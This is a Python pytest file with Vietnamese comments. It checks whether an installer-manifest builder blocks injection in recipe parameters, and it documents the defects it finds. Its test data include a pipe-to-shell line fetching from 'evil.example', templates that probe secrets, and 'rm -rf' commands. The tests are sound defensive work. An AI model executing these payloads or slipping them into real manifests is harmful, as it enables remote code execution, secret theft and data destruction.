"""T1 (tester độc lập) — MAN-03: tấn công recipe ở CẤP MANIFEST (WP2's
``namios_manifest._recipe_build``), KHÔNG phải ``namios_recipe`` (WP10) —
hai lớp phòng thủ độc lập theo thiết kế (xem docstring
``_recipe_build.py``). Mục tiêu: xác nhận lớp phòng thủ ĐỘC LẬP thứ nhất
(WP2, chạy khi ``ManifestValidatorImpl.load()``/``build_manifest()``)
cũng chặn được chính những kiểu injection mà WP10's ``namios_recipe.parse``
đã chặn (url-script pipe-to-shell, template nội suy ``{{...}}``/``${...}``)
— vì cả hai là "phòng thủ sâu" (defense in depth) cho CÙNG một luồng dữ
liệu (manifest JSON do publisher/kho cung cấp).

Viết ĐỘC LẬP với ``tests/unit/manifest/test_recipe_build.py`` của dev
(dev mới test ``shell``/``eval`` key + chuỗi shell ghép 1-argv; KHÔNG test
url-script/template nội suy NẰM TRONG GIÁ TRỊ của một param hợp lệ như
``installer_ref``/``dependency_profile_id``/``value``/``path_label``/
``app_id`` — case đó ``namios_recipe._parse`` của WP10 ĐÃ chặn bằng
``_scan_string_for_injection``, nhưng ``namios_manifest._recipe_build``
của WP2 KHÔNG gọi hàm tương đương)."""

from __future__ import annotations

import pytest

from namios_core.errors import ErrorCode
from namios_manifest._builder import build_manifest
from namios_manifest._errors import ManifestLoadError
from namios_manifest.validator import ManifestValidatorImpl

from ._qa_fixtures import baseline_manifest, mutate


def test_run_installer_ref_with_url_pipe_to_shell_is_NOT_blocked_by_manifest_layer() -> None:
    """DEFECT: ``namios_recipe._parse.parse_recipe_steps`` (WP10) chặn
    ``installer_ref`` chứa ``https://...|sh`` (xem
    ``test_url_script_pipe_to_shell_in_installer_ref_is_rejected`` trong
    ``tests/unit/recipe/test_parse_allowlist.py``). Nhưng khi CÙNG payload
    này đi qua đường ``ManifestValidatorImpl.load()``/``build_manifest()``
    (lớp phòng thủ của WP2 — thứ được dùng thật khi nạp một manifest từ
    kho/catalog), nó KHÔNG bị chặn: schema PASS, build_manifest() build
    thành công, và ``validate_semantic().install_ready`` vẫn ``True``.

    Đây là một lỗ hổng injection thật (COMP-004 "manifest chứa shell/
    URL-script" phải bị chặn) vì ``RunInstaller.installer_ref`` là dữ liệu
    publisher-controlled đi tới bước cài đặt — nếu mọi thứ khác (acquisition
    policy, host allowlist...) có sơ hở ở downstream, chuỗi
    ``| sh`` này là payload RCE cổ điển.
    """

    raw = mutate(baseline_manifest())
    raw["recipe"] = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "https://evil.example/x.sh | sh",
                "argv": ["installer.exe", "/S"],
            },
        }
    ]

    validator = ManifestValidatorImpl()
    schema_result = validator.validate_schema(raw)
    assert schema_result.ok is True  # tầng 1 không soi nội dung param (chủ ý, by design)

    # KỲ VỌNG AN TOÀN (như namios_recipe/WP10 đã làm cho CÙNG payload):
    # build_manifest() phải raise ManifestLoadError với E_SEMANTIC_RECIPE.
    # Nếu dòng dưới FAIL vì build_manifest() KHÔNG raise — đó là bằng chứng
    # defect MAN-03-QA-01 (xem evidence-index/T1), KHÔNG phải test sai.
    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)
    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_set_registry_value_with_template_interpolation_is_NOT_blocked_by_manifest_layer() -> None:
    """DEFECT tương tự: ``{{ secrets.admin_password }}`` trong
    ``set_registry_value.params.value`` bị ``namios_recipe._parse`` (WP10)
    chặn (xem ``test_template_interpolation_in_value_is_rejected``), nhưng
    lọt qua ``namios_manifest._recipe_build`` (WP2) vì ``_require_str`` ở
    đó không gọi scan injection nào."""

    raw = mutate(baseline_manifest())
    raw["recipe"] = [
        {
            "action": "set_registry_value",
            "params": {
                "key": "HKCU\\Software\\Demo",
                "value_name": "Mode",
                "value_type": "REG_SZ",
                "value": "{{ secrets.admin_password }}",
            },
        }
    ]

    validator = ManifestValidatorImpl()
    assert validator.validate_schema(raw).ok is True

    # Kỳ vọng an toàn: raise E_SEMANTIC_RECIPE. FAIL ở đây = defect MAN-03-QA-02.
    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)
    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_install_dependency_id_with_dollar_brace_template_is_NOT_blocked_by_manifest_layer() -> (
    None
):
    """DEFECT tương tự ở ``install_dependency.dependency_profile_id`` với
    cú pháp ``${env.SECRET_DEP}``. Nguy hiểm riêng ở field này: nếu
    downstream (planner/helper) dùng ``dependency_profile_id`` để tra một
    biến môi trường/secret store theo tên, injection template này có thể
    là một đường dò secret, KHÔNG chỉ là "shell token"."""

    raw = mutate(baseline_manifest())
    raw["runtime"]["dependency_profile_ids"] = ["${env.SECRET_DEP}"]
    raw["recipe"] = [
        {
            "action": "install_dependency",
            "params": {"dependency_profile_id": "${env.SECRET_DEP}"},
        }
    ]

    validator = ManifestValidatorImpl()
    assert validator.validate_schema(raw).ok is True

    # Kỳ vọng an toàn: raise E_SEMANTIC_RECIPE ngay ở build_manifest(), TRƯỚC
    # khi tới bước so khớp approved-list. FAIL ở đây = defect MAN-03-QA-03.
    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)
    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_run_installer_shell_metachar_split_across_multiple_argv_items_is_accepted_as_data() -> (
    None
):
    """KHÔNG phải defect — xác nhận hành vi ĐÚNG: khi ``argv`` có NHIỀU
    phần tử (argv-array thật), một phần tử đơn lẻ chứa ký tự shell
    metachar (ví dụ ``";"``) PHẢI được chấp nhận như dữ liệu literal (vì
    argv-only/``shell=False`` không có diễn giải shell) — không bị chặn
    nhầm. Test này cố ý xác nhận KHÔNG có false-positive, phân biệt rõ với
    case 1-argv-string-ghép mà dev đã test."""

    raw = mutate(baseline_manifest())
    raw["recipe"] = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "installer.exe",
                "argv": ["installer.exe", "/CONFIG=a;b|c"],
            },
        }
    ]

    m = build_manifest(raw)
    assert m.recipe[0].argv == ("installer.exe", "/CONFIG=a;b|c")  # type: ignore[union-attr]


def test_forbidden_key_case_variant_SHELL_uppercase_is_still_rejected_but_via_allowlist_path() -> (
    None
):
    """Khóa ``SHELL`` (viết hoa) KHÔNG khớp set ``_FORBIDDEN_PARAM_KEYS``
    (toàn chữ thường, so khớp phân biệt hoa/thường) — kiểm tra xem có phải
    lỗ hổng bypass hay không. KẾT LUẬN: không phải bypass thật, vì khóa lạ
    này vẫn bị chặn qua nhánh "không thuộc allowlist của action" (cùng
    ``ErrorCode``) — nhưng message sẽ SAI (nói "không thuộc allowlist" thay
    vì "bị cấm tuyệt đối"), ghi lại rõ để tránh hiểu nhầm là an toàn tuyệt
    đối theo đúng lý do."""

    raw = mutate(baseline_manifest())
    raw["recipe"] = [
        {
            "action": "run_installer",
            "params": {
                "installer_ref": "installer.exe",
                "argv": ["installer.exe", "/S"],
                "SHELL": "rm -rf ~",
            },
        }
    ]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    # Vẫn bị chặn (an toàn về mặt kết quả) — nhưng qua nhánh allowlist,
    # không qua nhánh "forbidden tuyệt đối".
    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)


def test_whole_recipe_rejected_no_partial_manifest_when_one_step_invalid() -> None:
    """Xác nhận "no partial build": một recipe có 2 bước, bước 1 hợp lệ,
    bước 2 có action ngoài allowlist -> build_manifest() KHÔNG được trả về
    Manifest chứa riêng bước 1 "coi như còn lại hợp lệ" — phải raise, loại
    bỏ toàn bộ."""

    raw = mutate(baseline_manifest())
    raw["recipe"] = [
        {"action": "create_prefix", "params": {"prefix_architecture": "win64"}},
        {"action": "run_arbitrary_shell", "params": {"cmd": "rm -rf /"}},
    ]

    with pytest.raises(ManifestLoadError) as exc_info:
        build_manifest(raw)

    assert any(e.code == ErrorCode.E_SEMANTIC_RECIPE.value for e in exc_info.value.errors)
